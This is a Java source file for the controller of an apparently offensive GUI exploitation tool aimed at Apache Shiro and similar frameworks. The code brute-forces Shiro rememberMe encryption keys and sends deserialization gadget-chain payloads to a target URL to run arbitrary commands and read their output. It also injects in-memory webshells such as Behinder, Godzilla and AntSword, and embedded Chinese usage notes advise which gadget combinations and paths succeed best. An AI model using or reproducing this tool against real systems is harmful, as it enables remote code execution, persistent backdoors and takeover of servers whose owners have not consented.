package vulgui;

import org.apache.commons.lang.StringUtils;
import vulgui.deser.frame.FramePayload;
import vulgui.deser.plugins.servlet.MemBytes;
import vulgui.deser.util.Gadgets;
import vulgui.deser.util.Gadgetsplugin;
import vulgui.exp.DserUtil;
import vulgui.utils.Console;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.event.ActionEvent;
import java.io.*;
import java.net.URL;
import java.util.*;


public class VulController {
    private PrintStream printStream;

    @FXML
    private TabPane tabpane;

    @FXML
    private Tab dsertab;

    @FXML
    private Tab redistab;

    @FXML
    private Tab mysqltab;

    @FXML
    private TextField command;

    @FXML
    private ChoiceBox<String> frameoption;

    // 框架选择影响UI变化

    final String[] frameList = new String[]{"shiro", "apereo", "liferay"};

    @FXML
    private ChoiceBox<String> gadget;

    @FXML
    private ChoiceBox<String> derecho;

    @FXML
    private CheckBox checkecho;

    @FXML
    private Button dserclearn;

    @FXML
    private TextField shiroKey;

    @FXML
    private CheckBox allshirokey;

    @FXML
    private CheckBox aesgcm;

    private static String shiroRememberme = null;

    @FXML
    private TextField httptimeout;

    @FXML
    private Button exectask;

    @FXML
    private TextArea resultoutput;

    @FXML
    private TextField targeturl;

    public Tab updateLog;

    @FXML
    private TextArea updateText;

    public static int TimeOut(TextField timevalue) {
        return Integer.parseInt(timevalue.getText()) * 1000;
    }

    public void initialize() {
        System.setProperty("com.mchange.v2.log.MLog", "com.mchange.v2.log.FallbackMLog");
        System.setProperty("com.mchange.v2.log.FallbackMLog.DEFAULT_CUTOFF_LEVEL", "WARNING");

        // 默认打开程序第一页为反序列化页面
        printStream = new PrintStream(new Console(resultoutput));
        System.setOut(printStream);
        System.setErr(printStream);

        updateText.appendText("2020.11.7 更新:\n");
        updateText.appendText("1. 判断密钥使用默认对象通过deleteMe返回判断,发送数据包小且准（参考xray）。\n");
        updateText.appendText("2. 优化高版本JDK base64库不一致导致执行失败。\n\n");

        updateText.appendText("2020.11.8 更新:\n");
        updateText.appendText("1. 高低版本base64库不一致,目前使用org.apache.shiro.codec.Base64避免此问题。\n\n");

        updateText.appendText("2020.11.10:\n");
        updateText.appendText("1. 修复注入内存马都显示注入成功的错误。\n\n");

        updateText.appendText("2020.11.23:\n");
        updateText.appendText("1. 忽略https证书错误。\n\n");

        updateText.appendText("2020.12.07:\n");
        updateText.appendText("1. 添加AES-GCM加密选项（shiro > 1.4.2 默认加密方式）\n");
        updateText.appendText("2. 修改注入内存马加载默认使用javassist避免jdk版本问题无法注入\n\n");


        resultoutput.appendText("使用方法：\n\n");
        resultoutput.appendText("勾选批量密钥/自定义密钥 -> 探测默认密钥 -> 选择gadget和回显框架 -> 执行\n");
        resultoutput.appendText("常见组合:\n\n");
        resultoutput.appendText("CommonsCollectionsK1 + TomcatEcho (xray)\n");
        resultoutput.appendText("CommonsBeanutils1 + TomcatEcho/SpringEcho\n");
        resultoutput.appendText("CommonsCollections2 + TomcatEcho (官方演示环境)\n\n");
        resultoutput.appendText("更换目标需要清除缓存，程序找到key后会将rememberMe字段写入缓存\n");

        resultoutput.appendText("-------------------------------------------------\n");
        resultoutput.appendText("注入内存马相关注意\n");
        resultoutput.appendText("由于冰蝎/哥斯拉,需要获取PageContext对象而spring环境不能直接获取所以纯spring环境请注入蚁剑\n");
        resultoutput.appendText("如遇到路径302跳转/404等错误,请自行寻找网站资源目录注入成功率更高或更换注入马\n");

        // 控件shiro密钥只在下拉框框架为shiro时候可输入
        frameoption.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            @Override
            public void changed(ObservableValue<? extends Number> observableValue, Number number, Number number2) {
                if ("shiro".equals(frameList[number2.intValue()])) {
                    shiroKey.setDisable(false);
                    allshirokey.setDisable(false);
                } else {
                    shiroKey.setDisable(true);
                    allshirokey.setDisable(true);
                }
            }
        });

        // shiro 勾选批量则禁用输入key
        allshirokey.selectedProperty().addListener(new ChangeListener<Boolean>() {
            @Override
            public void changed(ObservableValue<? extends Boolean> observable, Boolean oldValue, Boolean newValue) {
                if (allshirokey.isSelected()) {
                    shiroKey.setDisable(true);
                } else {
                    shiroKey.setDisable(false);
                }
            }
        });

        // 仅测试回显时禁止输入命令
        checkecho.selectedProperty().addListener(new ChangeListener<Boolean>() {
            @Override
            public void changed(ObservableValue<? extends Boolean> observable, Boolean oldValue, Boolean newValue) {
                if (checkecho.isSelected()) {
                    command.setText("");
                    command.setDisable(true);
                } else {
                    command.setDisable(false);
                }
            }
        });
        // 注入内存马时选择隧道则无需密码设置
        memoption.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
            // if the item of the list is changed
            @Override
            public void changed(ObservableValue ov, Number value, Number newValue) {
                // set the text for the label to the selected item
                if (newValue.intValue() >= 4) {
                    injectpass.setDisable(true);
                } else {
                    injectpass.setDisable(false);
                }
            }
        });
    }


    public void shiroEcho(final FramePayload payload, final Object chainObject, final List shiroKeys, final String command) throws Exception {

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < shiroKeys.size(); i++) {
                    String shirokey = (String) shiroKeys.get(i);
                    try {
                        final String sendpayload = payload.sendpayload(chainObject, shirokey);

                        String commandResult = DserUtil.exec(targeturl.getText(), sendpayload, command, TimeOut(httptimeout));
                        Thread.sleep(200);
                        if (commandResult != null) {
                            shiroKey.setDisable(false);
                            shiroKey.setText(shirokey);
                            allshirokey.setSelected(false);
                            shiroRememberme = sendpayload;
                            resultoutput.setText("-------------------\n");
                            resultoutput.appendText(commandResult + '\n');
                            resultoutput.appendText("-------------------\n");
                            break;
                        } else {
                            System.out.println("[x] " + shirokey);
                            resultoutput.appendText("[*] 请尝试其他构造链或者回显方法\n");
                        }
                    } catch (Exception e) {
                        System.out.println("[x] " + e.getMessage());
//                        break;
                    }
                }
            }
        });
        thread.start();

    }

    public void shiroTest(final FramePayload payload, final List shiroKeys) throws Exception {

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < shiroKeys.size(); i++) {
                    String shirokey = (String) shiroKeys.get(i);
                    try {
                        final String sendpayload = payload.sendpayload(DserUtil.principal, shirokey);

                        boolean flag = DserUtil.execTest(targeturl.getText(), sendpayload, DserUtil.timeout);
                        Thread.sleep(200);
                        if (flag) {
//                            final String rememberMeExec = payload.sendpayload(chainObject, shirokey);

                            shiroKey.setDisable(false);
                            command.setDisable(false);
                            shiroKey.setText(shirokey);
                            allshirokey.setSelected(false);
                            checkecho.setSelected(false);
                            resultoutput.setText("[*] default key: " + shirokey + "\n");
                            resultoutput.appendText("[*] 请选择构造链和回显方式并输入命令执行\n");
//                            shiroRememberme = rememberMeExec;
                            break;
                        } else {
                            System.out.println("[x] " + shirokey);
                        }
                    } catch (Exception e) {
                        System.out.println("[x] " + e.getMessage());
//                        System.out.println(e.getMessage());
//                        break;
                    }
                }
            }
        });
        thread.start();

    }

    @FXML
    void dserexec(ActionEvent event) throws Exception {
        /**
         * 1. 反序列化回显执行
         * */

        List<String> shiroKeys = new ArrayList<String>();

        String target = targeturl.getText().trim();

        String framename = frameoption.getValue().trim();
        String execoption = derecho.getValue().trim();
        String gadgetOption = gadget.getValue().trim();
        String cmd = command.getText().trim();
        String Shiro_key = shiroKey.getText().trim();

        DserUtil.timeout = TimeOut(httptimeout);

        if ("".equals(target)) {
            System.out.println("please input target");
        } else if ("".equals(execoption) || "".equals(gadgetOption)) {
            System.out.println("please confirm Gadget || echo payload || Command cannot be empty\n");
            System.out.println("-------------------------------\n");
        } else if ("".equals(cmd) && !checkecho.isSelected()) {
            System.out.println("please input command");
        } else if (shiroRememberme != null) {
            String commandResult = DserUtil.exec(target, shiroRememberme, cmd, DserUtil.timeout);
            if (commandResult != null) {
                resultoutput.appendText("-------------------------------\n");
                resultoutput.appendText(commandResult);
                resultoutput.appendText("-------------------------------\n");
            } else {
                resultoutput.appendText("-------------------------------\n");
                resultoutput.appendText("[x] 该命令执行失败请重试\n");
                resultoutput.appendText("-------------------------------\n");
            }
        } else {
            // 判断是否存在rememberMe字段
            boolean flag = DserUtil.rememberMe(target, DserUtil.timeout);
            if (!flag) {
                resultoutput.setText("该目录未发现rememberMe信息，请重试\n");
            } else {
                resultoutput.setText("发现rememberMe字段,正在测试\n");

                // aes cbc和gcm选择
                if(aesgcm.isSelected()){
                    DserUtil.aesCipherType = 1;
                }else{
                    DserUtil.aesCipherType = 0;
                }

                // 初始化构造连生成对象
                DserUtil.init_gen(gadgetOption, framename);

                Object template = Gadgets.createTemplatesImpl(execoption);
                // 回显payload选择
                Object chainObject;
                chainObject = DserUtil.gadgetpayload.getObject(template);

                // shiro加载key
                if (!shiroKey.isDisable()) {
                    shiroKeys.add(Shiro_key);
                    if (checkecho.isSelected()) {
                        shiroTest(DserUtil.genpayload, shiroKeys);
                    } else {
                        shiroEcho(DserUtil.genpayload, chainObject, shiroKeys, cmd);
                    }
                    // 批量跑key
                } else if (allshirokey.isSelected()) {
                    // 读配置文件
                    String cwd = System.getProperty("user.dir");
                    List<String> array = new ArrayList<String>(Arrays.asList(cwd, "resources", "shiro_keys.txt"));
                    File shiro_file = new File(StringUtils.join(array, File.separator));

                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));
                    try {
                        String line;
                        while ((line = br.readLine()) != null) {
                            shiroKeys.add(line);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    } finally {
                        if (br != null) {
                            br.close();
                        }
                    }
                    if (checkecho.isSelected()) {
                        shiroTest(DserUtil.genpayload, shiroKeys);
                    } else {
                        shiroEcho(DserUtil.genpayload, chainObject, shiroKeys, cmd);
                        System.out.println("scan over...");
                    }
                }
            }
        }
    }


    @FXML
    void dserclearn(ActionEvent event) {
        shiroRememberme = null;
    }


    @FXML
    private ChoiceBox<String> memoption;
    @FXML
    private TextField injectpath;
    @FXML
    private TextField injectpass;
    public Button meminject;

    @FXML
    void execinject(ActionEvent event) throws Exception {
        // 获取前台传递参数 注入类型 注入目录 注入密码
        String memOption = memoption.getValue().trim();
        String injectPath = injectpath.getText().trim();
        String injectPass;

        if (injectpass.isDisable()) {
            injectPass = "";
        } else {
            injectPass = injectpass.getText().trim();
        }

        // 获取得到的shiro default key
        String key = shiroKey.getText().trim();
        String target = targeturl.getText().trim();

        // 根据注入类型生成b64类字节码
        String b64Bytecode = MemBytes.getBytes(memOption);

        // 未初始化则初始化
        String framename = frameoption.getValue().trim();
        String gadgetOption = gadget.getValue().trim();
        DserUtil.init_gen(gadgetOption, framename);
//        if (DserUtil.gadgetpayload == null || DserUtil.genpayload == null) {
//
//            DserUtil.init_gen(gadgetOption, framename);
//        }
        // 将injectMem注入工具类 封装到构造链中执行
        Object template = Gadgets.createTemplatesImpl("InjectMemTool");
        Object chainObject = DserUtil.gadgetpayload.getObject(template);
        String rememberMe = DserUtil.genpayload.sendpayload(chainObject, key);

        String result = DserUtil.execInject(target, rememberMe, b64Bytecode, injectPath, injectPass, TimeOut(httptimeout));

        if (result != null && result.contains("dynamic inject success")) {
            URL url = new URL(target);
            int port;
            if (url.getPort() == -1) {
                port = url.getDefaultPort();
            } else {
                port = url.getPort();
            }
            String domain = url.getProtocol() + "://" + url.getHost() + ":" + port;

            resultoutput.setText("-------------------\n");
            resultoutput.appendText("注入成功请访问验证,如404则尝试拼接原有根目录:\n");
            resultoutput.appendText(domain + injectPath + '\n');
            if (memOption.contains("蚁剑")) {
                resultoutput.appendText("\n");
                resultoutput.appendText("ps: 蚁剑马->CUSTOM类型->请求返回均hex编码 (最新版)\n");
            } else {
                resultoutput.appendText("\n");
                resultoutput.appendText("ps: 马儿默认配置\n");
            }
            resultoutput.appendText("-------------------\n");
        } else {
            resultoutput.setText("-------------------\n");
            resultoutput.appendText("注入失败，请尝试更换目录（寻找网站资源目录）或使用其他内存马测试。\n");
            resultoutput.appendText("-------------------\n");
        }

    }
}
